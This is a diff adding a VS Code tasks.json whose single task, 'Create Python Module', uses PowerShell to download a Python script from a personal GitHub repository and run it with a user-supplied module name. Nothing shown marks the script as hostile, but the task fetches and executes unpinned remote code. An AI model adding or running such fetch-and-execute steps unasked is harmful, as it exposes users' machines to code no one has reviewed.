@@ -1,0 +1,32 @@
+
+{
+    "version": "2.0.0",
+    "tasks": [
+        {
+            "label": "Create Python Module",
+            "type": "process",
+            "command": "powershell",
+            "args": [
+                "-NoProfile",
+                "-Command",
+                "$script = Join-Path $env:TEMP 'create_module.py'; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/rubayet27/automation/refs/heads/main/file_gen.py' -OutFile $script; python $script '${input:moduleName}'"
+            ],
+            "options": {
+                "cwd": "${workspaceFolder}"
+            },
+            "problemMatcher": [],
+            "presentation": {
+                "reveal": "always",
+                "panel": "shared"
+            }
+        }
+    ],
+    "inputs": [
+        {
+            "id": "moduleName",
+            "type": "promptString",
+            "description": "Enter module name",
+            "default": "login"
+        }
+    ]
+}
